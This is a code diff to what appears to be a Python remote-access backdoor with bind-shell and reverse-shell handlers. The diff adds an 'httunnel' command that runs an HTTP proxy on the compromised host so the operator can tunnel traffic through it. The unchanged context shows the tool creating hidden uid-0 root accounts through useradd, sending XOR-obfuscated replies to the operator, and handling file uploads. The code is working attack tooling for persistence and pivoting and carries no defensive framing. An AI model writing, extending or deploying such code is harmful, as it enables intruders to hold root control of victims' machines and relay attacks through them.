@@ -572,6 +572,11 @@ def writeNewFile(filePath, fileContents):
   f.write(fileContents)
   f.close()
   
+  
+class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.copyfile(urllib2.urlopen(self.path), self.wfile)
+
 
 def fix_version(version):
     split_version = version.split(".")
@@ -706,7 +711,7 @@ def bindShell():
             conn.send(xor("[+] Root account " + acct + " has been created.\n", pin)) 
         elif cmd2 == ("httunnel"):
 	    httpd = SocketServer.ForkingTCPServer(('', HPORT), Proxy)
-            conn.send(xor("[+] Serving HTTP proxy on port %s" % HPORT), pin)
+            conn.send(xor("[+] Serving HTTP proxy on port "+ HPORT +"", pin))
 	    httpd.serve_forever()  
         elif cmd2.startswith('upload'):
             getname = cmd2.split(" ")
@@ -811,7 +816,11 @@ def reverseShell():
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
-            conn.send(xor("[+] Root account " + acct + " has been created.", pin))   
+            conn.send(xor("[+] Root account " + acct + " has been created.", pin))
+        elif cmd2 == ("httunnel"):
+	    httpd = SocketServer.ForkingTCPServer(('', HPORT), Proxy)
+            conn.send(xor("[+] Serving HTTP proxy on port "+ HPORT +"", pin))
+	    httpd.serve_forever()
         elif cmd2.startswith('upload'):
             getname = cmd2.split(" ")
             rem_file = getname[1]
